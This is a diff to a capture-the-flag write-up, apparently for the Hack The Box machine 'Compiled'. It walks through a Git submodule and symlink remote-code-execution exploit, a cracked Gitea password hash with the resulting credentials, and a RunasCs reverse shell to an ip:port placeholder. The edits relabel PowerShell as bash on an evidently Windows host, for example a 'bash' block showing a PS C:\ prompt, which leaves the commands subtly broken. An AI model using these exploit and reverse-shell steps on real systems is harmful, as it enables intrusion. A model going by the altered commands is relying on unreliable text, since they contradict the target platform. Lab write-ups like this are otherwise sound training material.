@@ -145,7 +145,7 @@ git config --global init.defaultBranch main
 *payload here*
 ```
 
-I chose to use the PowerShell Base64 encoded payload from `revshells.com`.
+I chose to use the bash Base64 encoded payload from `revshells.com`.
 
 4. Make the newly created file executable:
 
@@ -173,39 +173,39 @@ git update-index --index-info < index.info
 
 This is the crux of the exploit, let's break it down a bit:
 
-    (a) Create a file named `dotgit.txt` containing the string `.git`:
+- (a) Create a file named `dotgit.txt` containing the string `.git`:
 
-    ```bash
-    printf ".git" > dotgit.txt
-    ```
+   ```bash
+   printf ".git" > dotgit.txt
+   ```
 
-    This command writes the string `.git` to a file named `dotgit.txt`. This file will be used in the next step to generate a Git object.
+   This command writes the string `.git` to a file named `dotgit.txt`. This file will be used in the next step to generate a Git object.
 
-    (b) Generate a Git hash object from the contents of `dotgit.txt`:
+- (b) Generate a Git hash object from the contents of `dotgit.txt`:
 
-    ```bash
-    git hash-object -w --stdin < dotgit.txt > dot-git.hash
-    ```
+   ```bash
+   git hash-object -w --stdin < dotgit.txt > dot-git.hash
+   ```
 
-    Here, the `git hash-object` command reads the contents of `dotgit.txt` and creates a Git blob object. The `-w` flag writes this object to the Git object database, and the resulting hash is saved in the file `dot-git.hash`.
+   Here, the `git hash-object` command reads the contents of `dotgit.txt` and creates a Git blob object. The `-w` flag writes this object to the Git object database, and the resulting hash is saved in the file `dot-git.hash`.
 
-    (c) Prepare an index entry for the Git submodule with the symlink pointing to the `.git` directory:
+- (c) Prepare an index entry for the Git submodule with the symlink pointing to the `.git` directory:
 
-    ```bash
-    printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
-    ```
+   ```bash
+   printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
+   ```
 
-    This command formats a string with the appropriate Git index entry for a symlink. The mode `120000` indicates a symlink, and the hash of the object created in the previous step is inserted into the string. The result is saved to `index.info`.
+   This command formats a string with the appropriate Git index entry for a symlink. The mode `120000` indicates a symlink, and the hash of the object created in the previous step is inserted into the string. The result is saved to `index.info`.
 
-    (d) Update the Git index with the new entry from `index.info`:
+- (d) Update the Git index with the new entry from `index.info`:
 
-    ```bash
-    git update-index --index-info < index.info
-    ```
+   ```bash
+   git update-index --index-info < index.info
+   ```
 
-    Finally, the `git update-index` command reads the formatted string from `index.info` and updates the Git index with this new entry. This effectively adds a symlink in the repository that points to the `.git` directory of the submodule.
+Finally, the `git update-index` command reads the formatted string from `index.info` and updates the Git index with this new entry. This effectively adds a symlink in the repository that points to the `.git` directory of the submodule.
 
-    By creating a symlink to the `.git` directory, this setup can trick the victim into executing malicious hooks or commands when they interact with the repository. This specific manipulation allows the attacker to execute code on the victim's machine when the repository is cloned and checked out, leveraging Git's behavior with submodules and symlinks.
+By creating a symlink to the `.git` directory, this setup can trick the victim into executing malicious hooks or commands when they interact with the repository. This specific manipulation allows the attacker to execute code on the victim's machine when the repository is cloned and checked out, leveraging Git's behavior with submodules and symlinks.
 
 4. Commit this and push the changes.
 
@@ -217,7 +217,7 @@ We visit `http://compiled.htb:5000`, where the compilation app is hosted, and su
 
 After enumerating the host, we find `C:/Program Files/Gitea/data` with the file `Gitea.db`.
 
-```powershell
+```bash
 PS C:\Program Files\Gitea\data> ls
 
 Directory: C:\Program Files\Gitea\data
@@ -273,7 +273,7 @@ sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka
 as Emily's password. Emily cannot log in remotely, so we use `RunasCs.exe` to catch a shell as Emily from our non-interactive shell.
 
 ```bash
-.\RunasCs.exe Emily 12345679 powershell -r ip:port
+.\RunasCs.exe Emily 12345679 bash -r ip:port
 ```
 
 ## Privilege Escalation
